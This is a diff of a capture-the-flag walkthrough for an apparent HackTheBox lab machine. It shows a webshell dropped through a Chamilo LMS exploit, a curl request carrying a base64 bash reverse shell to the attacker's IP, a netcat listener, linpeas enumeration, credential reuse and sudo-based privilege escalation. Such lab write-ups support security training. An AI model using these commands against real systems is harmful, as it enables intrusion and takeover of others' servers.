@@ -138,8 +138,6 @@ Since the web service was found to be vulnerable, I proceeded to exploit it by c
    ```bash
    python3 poc.py -u http://lms.permx.htb -a webshell
 ```
-
-```bash
 Enter the name of the webshell file that will be placed on the target server (default: webshell.php): bam
 ```
 i was asked to chose a name for the webshell so i chose a random name "bam"
@@ -162,7 +160,7 @@ To gain access to the system, I used the newly created web shell to execute a re
 1. **Execute the Payload**: I crafted a `curl` command to send a base64-encoded payload to the web shell. The payload was decoded and executed via the web shell, which initiated a reverse shell connection. The command used was:
    ```bash
    curl "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOS80NDQ0IDA%2bJjE%3d'+|base64+-d+|bash"
-
+edit the base64 payload to your own ip adress
 **Result**
 ```bash
 nc -lnvp 4444
@@ -196,7 +194,9 @@ zsh: suspended  nc -lnvp 4444
 www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
 ```
 now we have a fully interactive shell
-after manually browsing through config files looking for creds or any other information i can leverage i decided ot's time to download 
+
+---
+after manually browsing through config files looking for creds or any other information i can leverage i decided it's time to download 
 'linpeash.sh' ontop the box
 ### Downloading linpeas.sh Using a Python Web Server
 
@@ -220,11 +220,18 @@ After running `linpeas.sh` and reviewing the results, several items caught my at
 
 
 - **Vhost Configuration Files**: The configuration files contained some email addresses that might be useful.
+- ![intressant1](https://github.com/user-attachments/assets/0c7748d0-9df1-4e36-a3be-07e5e9cdbf00)    ![interassant2](https://github.com/user-attachments/assets/462a899c-e2ff-46d4-8bd8-b639d86bf3af)
+
+
 - **FTP Credentials**: Found FTP credentials that could potentially be used for accessing files.
+- ![ftpcreds](https://github.com/user-attachments/assets/701045cf-4944-4e03-8294-87e0bf3e341a)
+
 - **MongoDB Link**: Discovered a link to MongoDB that might be leveraged for further access.
 - **Database Password**: Identified a database password that could be useful for accessing services or further escalation.
 
+
 I decided to follow the easier path of trying common passwords for known services:
+![configpass](https://github.com/user-attachments/assets/e538fa1a-df49-46bd-8ab2-9f056223d77d)
 
 1. **Attempting Password Reuse**:
    - **FTP Credentials**: Used the found FTP credentials to access the FTP service.
@@ -237,6 +244,18 @@ This approach enabled me to escalate privileges and gain access to the `mtz` use
 ### Privilege Escalation to root
 
 After logging in as the `mtz` user via SSH, the first step was to check which sudo commands could be run. The result showed that `mtz` had permission to run `/opt/acl.sh` with `sudo` without a password.
+
+
+```bash
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+```
 
 #### Analyzing `acl.sh`
 
